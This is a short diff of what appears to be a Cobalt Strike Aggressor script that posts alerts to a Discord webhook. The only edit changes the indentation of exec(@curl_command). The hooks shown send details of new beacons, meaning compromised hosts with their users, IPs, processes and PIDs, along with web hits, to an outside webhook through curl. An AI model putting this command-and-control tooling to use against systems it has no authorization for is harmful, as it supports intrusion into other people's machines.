@@ -26,7 +26,7 @@ on beacon_initial {
 	$pid = beacon_data($1)["pid"];
 	
 	@curl_command = @('curl','-X','POST','-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_beacon.' New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')\n\n'.$discord_emoji_info.' Beacon details:\n\nExternal: '.$external.'\nInternal: '.$internal.'\nListener: '.$listener.'\nUser: '.$user.'\nComputer: '.$computer.'\nProccess: '.$process.'\nPid: '.$pid.'\nArch: '.$arch.'"}', $discord_webhookURL);
-	exec(@curl_command);
+    exec(@curl_command);
 }
 
 # New CS Client Connected Alert
@@ -66,7 +66,7 @@ on keystrokes {
 # New Web Hit Alert
 on web_hit {
 	@curl_command = @('curl','-X','POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_web_hit.' New Web hit!\n\n'.$discord_emoji_info.' Web Log details:\n\nFrom: '.$3.'\nRequest: '.$1.' '.$2.'\nResponse: '.$5.'\nUser-Agent: '.$4.'"}',$discord_webhookURL);
-	exec(@curl_command);
+    exec(@curl_command);
 }
 
 # New Screenshot Alert
